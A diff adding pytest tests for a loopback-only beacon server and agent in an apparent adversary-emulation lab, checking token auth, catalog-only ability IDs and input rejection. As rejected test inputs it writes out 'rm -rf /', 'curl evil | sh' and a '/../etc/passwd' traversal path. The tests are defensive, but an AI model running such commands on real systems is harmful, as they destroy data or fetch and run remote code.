@@ -1,12 +1,16 @@
 from __future__ import annotations
 
 import json
+import urllib.error
+import urllib.request
 from pathlib import Path
 
 import pytest
 
 from caldera_lab import cli
 from caldera_lab import planner as planner_module
+from caldera_lab.agent import BeaconAgent
+from caldera_lab.beacon import BeaconRefused, BeaconServer, BeaconState
 from caldera_lab.catalog import AbilityCatalog
 from caldera_lab.executor import DryRunExecutor, ExecutionResult, LocalLabExecutor
 from caldera_lab.orchestrator import Orchestrator
@@ -676,3 +680,146 @@ def test_report_json_keeps_counter_keys_intact(catalog: AbilityCatalog, tmp_path
     assert set(payload["succeeded"]) <= set(catalog.ids())
     assert all(isinstance(key, str) for key in payload["succeeded"])
     json.dumps(payload)
+
+
+@pytest.fixture
+def beacon(catalog: AbilityCatalog):
+    state = BeaconState(catalog, queue=catalog.ids())
+    server = BeaconServer(state).start()
+    try:
+        yield server, state
+    finally:
+        server.stop()
+
+
+def _raw_post(
+    url: str, path: str, payload: dict[str, object], token: str | None
+) -> tuple[int, dict[str, object]]:
+    headers = {"Content-Type": "application/json"}
+    if token is not None:
+        headers["X-Caldera-Token"] = token
+    request = urllib.request.Request(
+        f"{url}{path}", data=json.dumps(payload).encode(), headers=headers, method="POST"
+    )
+    try:
+        with urllib.request.urlopen(request, timeout=5) as response:
+            return response.status, json.loads(response.read().decode())
+    except urllib.error.HTTPError as exc:
+        return exc.code, json.loads(exc.read().decode())
+
+
+def test_beacon_server_refuses_to_bind_anything_but_loopback(catalog: AbilityCatalog) -> None:
+    for host in ("0.0.0.0", "::", "192.168.1.10", ""):
+        with pytest.raises(BeaconRefused, match="binds 127.0.0.1 only"):
+            BeaconServer(BeaconState(catalog), host=host)
+
+
+def test_beacon_server_binds_loopback(beacon) -> None:
+    server, _ = beacon
+    assert server.url.startswith("http://127.0.0.1:")
+
+
+def test_beacon_requires_the_run_token(beacon) -> None:
+    server, _ = beacon
+    # Reaching loopback is not authorisation; any local process could otherwise
+    # drive the lab.
+    assert _raw_post(server.url, "/register", {"agent_id": "a"}, None)[0] == 401
+    assert _raw_post(server.url, "/register", {"agent_id": "a"}, "wrong")[0] == 401
+    assert _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)[0] == 200
+
+
+def test_beacon_never_sends_a_command(beacon) -> None:
+    server, _ = beacon
+    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
+    status, body = _raw_post(server.url, "/beacon", {"agent_id": "a"}, server.token)
+    assert status == 200
+    # The wire carries an ability ID and nothing else executable.
+    assert set(body) == {"ability_id"}
+    assert body["ability_id"] in set(server.state.catalog.ids())
+
+
+def test_beacon_queue_rejects_an_ability_outside_the_catalog(catalog: AbilityCatalog) -> None:
+    with pytest.raises(KeyError):
+        BeaconState(catalog, queue=("rm -rf /",))
+
+
+def test_beacon_rejects_a_result_for_an_unknown_ability(beacon) -> None:
+    server, _ = beacon
+    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
+    status, _ = _raw_post(
+        server.url,
+        "/result",
+        {"agent_id": "a", "ability_id": "curl evil | sh", "status": "succeeded"},
+        server.token,
+    )
+    assert status == 400
+
+
+def test_beacon_rejects_an_unregistered_agent(beacon) -> None:
+    server, _ = beacon
+    assert _raw_post(server.url, "/beacon", {"agent_id": "ghost"}, server.token)[0] == 403
+
+
+def test_beacon_rejects_unknown_endpoints_and_methods(beacon) -> None:
+    server, _ = beacon
+    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
+    assert _raw_post(server.url, "/../etc/passwd", {"agent_id": "a"}, server.token)[0] == 404
+    assert _raw_post(server.url, "/shell", {"agent_id": "a"}, server.token)[0] == 404
+    request = urllib.request.Request(server.url + "/beacon", method="GET")
+    with pytest.raises(urllib.error.HTTPError) as exc:
+        urllib.request.urlopen(request, timeout=5)
+    assert exc.value.code in {401, 405}
+
+
+def test_beacon_rejects_an_oversized_body(beacon) -> None:
+    server, _ = beacon
+    _raw_post(server.url, "/register", {"agent_id": "a"}, server.token)
+    payload = {"agent_id": "a", "ability_id": "collect-host-identity", "stdout": "x" * 300_000}
+    assert _raw_post(server.url, "/result", payload, server.token)[0] == 400
+
+
+def test_beacon_rejects_a_malformed_agent_id(beacon) -> None:
+    server, _ = beacon
+    assert _raw_post(server.url, "/register", {"agent_id": ""}, server.token)[0] == 400
+    assert _raw_post(server.url, "/register", {"agent_id": 7}, server.token)[0] == 400
+
+
+def test_agent_completes_the_beacon_cycle(beacon, catalog: AbilityCatalog) -> None:
+    server, state = beacon
+    agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
+    executed = agent.run()
+    assert executed == list(catalog.ids())
+    record = state.agents[agent.agent_id]
+    assert len(record.results) == len(catalog.ids())
+    assert {result["ability_id"] for result in record.results} == set(catalog.ids())
+
+
+def test_agent_stops_when_the_queue_is_empty(beacon, catalog: AbilityCatalog) -> None:
+    server, _ = beacon
+    agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
+    assert len(agent.run(max_beacons=64)) == len(catalog.ids())
+
+
+def test_agent_still_applies_the_local_policy(catalog: AbilityCatalog) -> None:
+    state = BeaconState(catalog, queue=("collect-process-list",))
+    server = BeaconServer(state).start()
+    try:
+        # The server asked for an ability this lab has not approved.
+        policy = LabPolicy(approved_abilities=frozenset({"collect-host-identity"}))
+        agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, policy)
+        with pytest.raises(PermissionError):
+            agent.run()
+    finally:
+        server.stop()
+
+
+def test_serve_cli_runs_a_full_cycle(capsys) -> None:
+    cli.main(["serve", "--executor", "dry-run", "--steps", "3"])
+    out = capsys.readouterr().out
+    assert "http://127.0.0.1:" in out
+    assert "executed 3 abilities" in out
+
+
+def test_serve_cli_honours_the_local_executor_gate() -> None:
+    with pytest.raises(SystemExit):
+        cli.main(["serve", "--executor", "local", "--steps", "1"])
